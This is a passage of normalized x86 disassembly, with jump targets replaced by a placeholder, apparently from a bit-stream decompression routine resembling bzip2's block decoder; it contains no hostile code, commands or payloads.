jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x20 ]
sub ecx 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1c ]
shr eax cl
and eax 0xff
mov [ ebp - 0x80 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x20 ]
sub edx 0x8
mov eax [ ebp + 0x8 ]
mov [ eax + 0x20 ] edx
mov cl [ ebp - 0x80 ]
mov [ ebp - 0x39 ] cl
jmp r-xdata
mov [ ebp - 0x10 ] 0xfffffffb
jmp r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x24 ] 0x39
jle r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
cmp [ ecx + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x20 ]
sub ecx 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1c ]
shr eax cl
and eax 0xff
mov [ ebp - 0x84 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x20 ]
sub edx 0x8
mov eax [ ebp + 0x8 ]
mov [ eax + 0x20 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x84 ]
mov [ ecx + 0x24 ] edx
jmp r-xdata
movzx eax [ ebp - 0x39 ]
cmp eax 0x31
je r-xdata
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x20 ]
sub ecx 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1c ]
shr eax cl
and eax 0xff
mov [ ebp - 0x88 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x20 ]
sub edx 0x8
mov eax [ ebp + 0x8 ]
mov [ eax + 0x20 ] edx
mov cl [ ebp - 0x88 ]
mov [ ebp - 0x39 ] cl
jmp r-xdata
mov [ ebp - 0x10 ] 0xfffffffc
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x20 ]
sub ecx 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1c ]
shr eax cl
and eax 0xff
mov [ ebp - 0x8c ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x20 ]
sub edx 0x8
mov eax [ ebp + 0x8 ]
mov [ eax + 0x20 ] edx
mov cl [ ebp - 0x8c ]
mov [ ebp - 0x39 ] cl
jmp r-xdata
mov [ ebp - 0x10 ] 0xfffffffc
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x20 ]
sub ecx 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1c ]
shr eax cl
and eax 0xff
mov [ ebp - 0x90 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x20 ]
sub edx 0x8
mov eax [ ebp + 0x8 ]
mov [ eax + 0x20 ] edx
mov cl [ ebp - 0x90 ]
mov [ ebp - 0x39 ] cl
jmp r-xdata
mov [ ebp - 0x10 ] 0xfffffffc
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x20 ]
sub ecx 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1c ]
shr eax cl
and eax 0xff
mov [ ebp - 0x94 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x20 ]
sub edx 0x8
mov eax [ ebp + 0x8 ]
mov [ eax + 0x20 ] edx
mov cl [ ebp - 0x94 ]
mov [ ebp - 0x39 ] cl
jmp r-xdata
mov [ ebp - 0x10 ] 0xfffffffc
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x20 ]
sub ecx 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1c ]
shr eax cl
and eax 0xff
mov [ ebp - 0x98 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x20 ]
sub edx 0x8
mov eax [ ebp + 0x8 ]
mov [ eax + 0x20 ] edx
mov cl [ ebp - 0x98 ]
mov [ ebp - 0x39 ] cl
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x2c ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x2c ] ecx
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x30 ] 0x2
jl r-xdata
mov [ ebp - 0x10 ] 0xfffffffc
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x20 ]
sub ecx 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1c ]
shr eax cl
and eax 0xff
mov [ ebp - 0x9c ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x20 ]
sub edx 0x8
mov eax [ ebp + 0x8 ]
mov [ eax + 0x20 ] edx
mov cl [ ebp - 0x9c ]
mov [ ebp - 0x39 ] cl
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x20 ]
sub ecx 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1c ]
shr eax cl
and eax 0xff
mov [ ebp - 0xa0 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x20 ]
sub edx 0x8
mov eax [ ebp + 0x8 ]
mov [ eax + 0x20 ] edx
mov cl [ ebp - 0xa0 ]
mov [ ebp - 0x39 ] cl
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x20 ]
sub ecx 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1c ]
shr eax cl
and eax 0xff
mov [ ebp - 0xa4 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x20 ]
sub edx 0x8
mov eax [ ebp + 0x8 ]
mov [ eax + 0x20 ] edx
mov cl [ ebp - 0xa4 ]
mov [ ebp - 0x39 ] cl
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x20 ]
sub ecx 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1c ]
shr eax cl
and eax 0xff
mov [ ebp - 0xa8 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x20 ]
sub edx 0x8
mov eax [ ebp + 0x8 ]
mov [ eax + 0x20 ] edx
mov cl [ ebp - 0xa8 ]
mov [ ebp - 0x39 ] cl
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x20 ]
sub ecx 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1c ]
shr eax cl
and eax 0xff
mov [ ebp - 0xac ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x20 ]
sub edx 0x8
mov eax [ ebp + 0x8 ]
mov [ eax + 0x20 ] edx
mov cl [ ebp - 0xac ]
mov [ ebp - 0x39 ] cl
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
cmp [ ecx + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x20 ]
sub ecx 0x1
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1c ]
shr eax cl
and eax 0x1
mov [ ebp - 0xb0 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x20 ]
sub edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x20 ] edx
mov ecx [ ebp + 0x8 ]
mov dl [ ebp - 0xb0 ]
mov [ ecx + 0x10 ] dl
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x20 ]
sub ecx 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1c ]
shr eax cl
and eax 0xff
mov [ ebp - 0xb4 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x20 ]
sub edx 0x8
mov eax [ ebp + 0x8 ]
mov [ eax + 0x20 ] edx
mov cl [ ebp - 0xb4 ]
mov [ ebp - 0x39 ] cl
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x20 ]
sub ecx 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1c ]
shr eax cl
and eax 0xff
mov [ ebp - 0xb8 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x20 ]
sub edx 0x8
mov eax [ ebp + 0x8 ]
mov [ eax + 0x20 ] edx
mov cl [ ebp - 0xb8 ]
mov [ ebp - 0x39 ] cl
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x24 ]
imul edx edx 0x186a0
add edx 0xa
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x34 ] edx
jle r-xdata
mov [ ebp - 0x10 ] 0xfffffffc
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x20 ]
sub ecx 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1c ]
shr eax cl
and eax 0xff
mov [ ebp - 0xbc ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x20 ]
sub edx 0x8
mov eax [ ebp + 0x8 ]
mov [ eax + 0x20 ] edx
mov cl [ ebp - 0xbc ]
mov [ ebp - 0x39 ] cl
jmp r-xdata
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x18 ]
mov [ eax + 0xd6c ] 0x0
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x18 ]
mov [ edx + 0xd6c ] 0x1
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
cmp [ edx + 0x4 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov ecx [ edx + 0x20 ]
sub ecx 0x1
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x1c ]
shr edx cl
and edx 0x1
mov [ ebp - 0xc0 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x20 ]
sub ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x20 ] ecx
mov al [ ebp - 0xc0 ]
mov [ ebp - 0x39 ] al
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x18 ]
shl eax 0x4
add eax [ ebp - 0x74 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + eax + 0xc6c ] 0x1
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x20 ]
sub ecx 0x1
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1c ]
shr eax cl
and eax 0x1
mov [ ebp - 0xc4 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x20 ]
sub edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x20 ] edx
mov cl [ ebp - 0xc4 ]
mov [ ebp - 0x39 ] cl
jmp r-xdata
mov [ ebp - 0x10 ] 0xfffffffc
jmp r-xdata
cmp [ ebp - 0x68 ] 0x6
jle r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x20 ]
sub ecx 0x3
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1c ]
shr eax cl
and eax 0x7
mov [ ebp - 0xc8 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x20 ]
sub edx 0x3
mov eax [ ebp + 0x8 ]
mov [ eax + 0x20 ] edx
mov ecx [ ebp - 0xc8 ]
mov [ ebp - 0x68 ] ecx
jmp r-xdata
mov [ ebp - 0x18 ] 0x0
jmp r-xdata
mov [ ebp - 0x10 ] 0xfffffffc
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
cmp [ edx + 0x4 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov ecx [ edx + 0x20 ]
sub ecx 0xf
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x1c ]
shr edx cl
and edx 0x7fff
mov [ ebp - 0xcc ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x20 ]
sub ecx 0xf
mov edx [ ebp + 0x8 ]
mov [ edx + 0x20 ] ecx
mov eax [ ebp - 0xcc ]
mov [ ebp - 0x64 ] eax
jmp r-xdata
mov eax [ ebp - 0x74 ]
add eax 0x1
mov [ ebp - 0x74 ] eax
mov ecx [ ebp - 0x74 ]
cmp ecx [ ebp - 0x68 ]
jl r-xdata
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x20 ]
sub ecx 0x1
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1c ]
shr eax cl
and eax 0x1
mov [ ebp - 0xd0 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x20 ]
sub edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x20 ] edx
mov cl [ ebp - 0xd0 ]
mov [ ebp - 0x39 ] cl
jmp r-xdata
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x38 ]
jge r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x20 ]
sub ecx 0x5
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1c ]
shr eax cl
and eax 0x1f
mov [ ebp - 0xe4 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x20 ]
sub edx 0x5
mov eax [ ebp + 0x8 ]
mov [ eax + 0x20 ] edx
mov ecx [ ebp - 0xe4 ]
mov [ ebp - 0x28 ] ecx
jmp r-xdata
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
cmp [ edx + 0x4 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov ecx [ edx + 0x20 ]
sub ecx 0x1
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x1c ]
shr edx cl
and edx 0x1
mov [ ebp - 0xe8 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x20 ]
sub ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x20 ] ecx
mov al [ ebp - 0xe8 ]
mov [ ebp - 0x39 ] al
jmp r-xdata
mov eax [ ebp - 0x28 ]
sub eax 0x1
mov [ ebp - 0x28 ] eax
mov edx [ ebp - 0x28 ]
add edx 0x1
mov [ ebp - 0x28 ] edx
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
cmp [ edx + 0x4 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov ecx [ edx + 0x20 ]
sub ecx 0x1
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x1c ]
shr edx cl
and edx 0x1
mov [ ebp - 0xec ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x20 ]
sub ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x20 ] ecx
mov al [ ebp - 0xec ]
mov [ ebp - 0x39 ] al
jmp r-xdata
mov eax [ ebp - 0x4c ]
mov ecx [ ebp - 0x5c ]
mov edx [ ebp - 0xc ]
sub edx [ ecx + eax * 4 ]
js r-xdata
cmp [ ebp - 0x4c ] 0x14
jle r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
cmp [ edx + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x20 ]
sub ecx [ ebp - 0x4c ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1c ]
shr eax cl
mov edx 0x1
mov ecx [ ebp - 0x4c ]
shl edx cl
sub edx 0x1
and eax edx
mov [ ebp - 0xfc ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x20 ]
sub ecx [ ebp - 0x4c ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x20 ] ecx
mov eax [ ebp - 0xfc ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x20 ]
sub ecx 0x1
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1c ]
shr eax cl
and eax 0x1
mov [ ebp - 0x100 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x20 ]
sub edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x20 ] edx
mov ecx [ ebp - 0x100 ]
mov [ ebp - 0x24 ] ecx
jmp r-xdata
mov eax [ ebp - 0x4c ]
mov ecx [ ebp - 0x5c ]
mov edx [ ebp - 0xc ]
sub edx [ ecx + eax * 4 ]
js r-xdata
cmp [ ebp - 0x4c ] 0x14
jle r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
cmp [ edx + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x20 ]
sub ecx [ ebp - 0x4c ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1c ]
shr eax cl
mov edx 0x1
mov ecx [ ebp - 0x4c ]
shl edx cl
sub edx 0x1
and eax edx
mov [ ebp - 0x104 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x20 ]
sub ecx [ ebp - 0x4c ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x20 ] ecx
mov eax [ ebp - 0x104 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x20 ]
sub ecx 0x1
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1c ]
shr eax cl
and eax 0x1
mov [ ebp - 0x108 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x20 ]
sub edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x20 ] edx
mov ecx [ ebp - 0x108 ]
mov [ ebp - 0x24 ] ecx
jmp r-xdata
mov eax [ ebp - 0x4c ]
mov ecx [ ebp - 0x5c ]
mov edx [ ebp - 0xc ]
sub edx [ ecx + eax * 4 ]
js r-xdata
cmp [ ebp - 0x4c ] 0x14
jle r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
cmp [ edx + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x20 ]
sub ecx [ ebp - 0x4c ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1c ]
shr eax cl
mov edx 0x1
mov ecx [ ebp - 0x4c ]
shl edx cl
sub edx 0x1
and eax edx
mov [ ebp - 0x12c ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x20 ]
sub ecx [ ebp - 0x4c ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x20 ] ecx
mov eax [ ebp - 0x12c ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x20 ]
sub ecx 0x1
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1c ]
shr eax cl
and eax 0x1
mov [ ebp - 0x130 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x20 ]
sub edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x20 ] edx
mov ecx [ ebp - 0x130 ]
mov [ ebp - 0x24 ] ecx
jmp r-xdata
mov [ ebp - 0x10 ] 0xfffffffc
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x20 ]
sub ecx 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1c ]
shr eax cl
and eax 0xff
mov [ ebp - 0x138 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x20 ]
sub edx 0x8
mov eax [ ebp + 0x8 ]
mov [ eax + 0x20 ] edx
mov cl [ ebp - 0x138 ]
mov [ ebp - 0x39 ] cl
jmp r-xdata
mov [ ebp - 0x10 ] 0xfffffffc
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x20 ]
sub ecx 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1c ]
shr eax cl
and eax 0xff
mov [ ebp - 0x13c ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x20 ]
sub edx 0x8
mov eax [ ebp + 0x8 ]
mov [ eax + 0x20 ] edx
mov cl [ ebp - 0x13c ]
mov [ ebp - 0x39 ] cl
jmp r-xdata
mov [ ebp - 0x10 ] 0xfffffffc
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x20 ]
sub ecx 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1c ]
shr eax cl
and eax 0xff
mov [ ebp - 0x140 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x20 ]
sub edx 0x8
mov eax [ ebp + 0x8 ]
mov [ eax + 0x20 ] edx
mov cl [ ebp - 0x140 ]
mov [ ebp - 0x39 ] cl
jmp r-xdata
mov [ ebp - 0x10 ] 0xfffffffc
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x20 ]
sub ecx 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1c ]
shr eax cl
and eax 0xff
mov [ ebp - 0x144 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x20 ]
sub edx 0x8
mov eax [ ebp + 0x8 ]
mov [ eax + 0x20 ] edx
mov cl [ ebp - 0x144 ]
mov [ ebp - 0x39 ] cl
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0xc5c ] 0x0
mov [ ebp - 0x10 ] 0xfffffffc
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x20 ]
sub ecx 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1c ]
shr eax cl
and eax 0xff
mov [ ebp - 0x148 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x20 ]
sub edx 0x8
mov eax [ ebp + 0x8 ]
mov [ eax + 0x20 ] edx
mov cl [ ebp - 0x148 ]
mov [ ebp - 0x39 ] cl
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x20 ]
sub ecx 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1c ]
shr eax cl
and eax 0xff
mov [ ebp - 0x14c ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x20 ]
sub edx 0x8
mov eax [ ebp + 0x8 ]
mov [ eax + 0x20 ] edx
mov cl [ ebp - 0x14c ]
mov [ ebp - 0x39 ] cl
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x20 ]
sub ecx 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1c ]
shr eax cl
and eax 0xff
mov [ ebp - 0x150 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x20 ]
sub edx 0x8
mov eax [ ebp + 0x8 ]
mov [ eax + 0x20 ] edx
mov cl [ ebp - 0x150 ]
mov [ ebp - 0x39 ] cl
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x20 ]
sub ecx 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1c ]
shr eax cl
and eax 0xff
mov [ ebp - 0x154 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x20 ]
sub edx 0x8
mov eax [ ebp + 0x8 ]
mov [ eax + 0x20 ] edx
mov cl [ ebp - 0x154 ]
mov [ ebp - 0x39 ] cl
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x20 ]
sub ecx 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1c ]
shr eax cl
and eax 0xff
mov [ ebp - 0x158 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x20 ]
sub edx 0x8
mov eax [ ebp + 0x8 ]
mov [ eax + 0x20 ] edx
mov cl [ ebp - 0x158 ]
mov [ ebp - 0x39 ] cl
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
shl edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov eax [ ecx ]
movzx ecx [ eax ]
or edx ecx
mov eax [ ebp + 0x8 ]
mov [ eax + 0x1c ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x20 ]
add edx 0x8
mov eax [ ebp + 0x8 ]
mov [ eax + 0x20 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ edx ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
sub edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x4 ] edx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ eax + 0x8 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
cmp [ edx + 0x8 ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
shl edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov eax [ ecx ]
movzx ecx [ eax ]
or edx ecx
mov eax [ ebp + 0x8 ]
mov [ eax + 0x1c ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x20 ]
add edx 0x8
mov eax [ ebp + 0x8 ]
mov [ eax + 0x20 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ edx ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
sub edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x4 ] edx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ eax + 0x8 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
cmp [ edx + 0x8 ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
shl edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov eax [ ecx ]
movzx ecx [ eax ]
or edx ecx
mov eax [ ebp + 0x8 ]
mov [ eax + 0x1c ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x20 ]
add edx 0x8
mov eax [ ebp + 0x8 ]
mov [ eax + 0x20 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ edx ]
add eax 0x1
